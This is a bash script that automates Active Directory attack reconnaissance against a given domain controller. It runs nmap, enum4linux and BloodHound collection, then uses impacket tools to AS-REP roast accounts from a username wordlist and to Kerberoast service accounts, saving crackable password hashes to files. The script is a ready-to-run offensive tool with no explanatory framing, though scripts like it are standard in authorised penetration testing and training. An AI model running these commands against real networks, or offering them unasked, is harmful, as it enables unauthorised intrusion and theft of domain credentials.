#!/bin/bash
# ad-enum.sh
# Automated Active Directory enumeration from Kali Linux
# Usage: ./ad-enum.sh <DC_IP> <DOMAIN> <USERNAME> <PASSWORD>

DC=$1
DOMAIN=$2
USER=$3
PASS=$4

echo "========================================"
echo "  Active Directory Enumeration Script"
echo "  Target: $DOMAIN @ $DC"
echo "========================================"

echo -e "\n[*] Running Nmap scan..."
nmap -p 53,88,135,139,389,445,636,3268,3269 --script ldap-rootdse $DC -oN nmap-ad.txt
echo "[+] Nmap results saved to nmap-ad.txt"

echo -e "\n[*] Running enum4linux..."
enum4linux -a $DC > enum4linux.txt
echo "[+] enum4linux results saved to enum4linux.txt"

echo -e "\n[*] Running BloodHound collection..."
bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c all
echo "[+] BloodHound data collected"

echo -e "\n[*] Checking for AS-REP Roastable users..."
impacket-GetNPUsers $DOMAIN/ -usersfile /usr/share/wordlists/seclists/Usernames/Names/names.txt \
  -no-pass -dc-ip $DC -outputfile asrep-hashes.txt
echo "[+] AS-REP hashes saved to asrep-hashes.txt"

echo -e "\n[*] Checking for Kerberoastable users..."
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerb-hashes.txt
echo "[+] Kerberoast hashes saved to kerb-hashes.txt"

echo -e "\n[+] Enumeration complete!"
